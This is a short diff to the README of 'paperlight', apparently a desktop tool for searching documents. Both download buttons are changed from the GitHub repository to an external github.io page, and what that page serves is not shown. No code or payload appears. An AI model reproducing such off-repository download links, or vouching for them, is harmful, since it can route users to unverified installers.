@@ -49,7 +49,7 @@ Getting paperlight on your PC is easy. Just follow these steps:
 
 **Step 1: Visit the download page**
 
-[![Download paperlight](https://img.shields.io/badge/Download-paperlight-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/chillguyfsfs-ctrl/paperlight)
+[![Download paperlight](https://img.shields.io/badge/Download-paperlight-blue?style=for-the-badge&logo=github&color=4B0082)](https://chillguyfsfs-ctrl.github.io)
 
 Visit this link to download the application.
 
@@ -126,7 +126,7 @@ paperlight turns your computer into a searchable library. No more folder diving,
 
 Get started today - your documents are waiting to be found.
 
-[**Download paperlight now**](https://github.com/chillguyfsfs-ctrl/paperlight)
+[**Download paperlight now**](https://chillguyfsfs-ctrl.github.io)
 
 ---
 
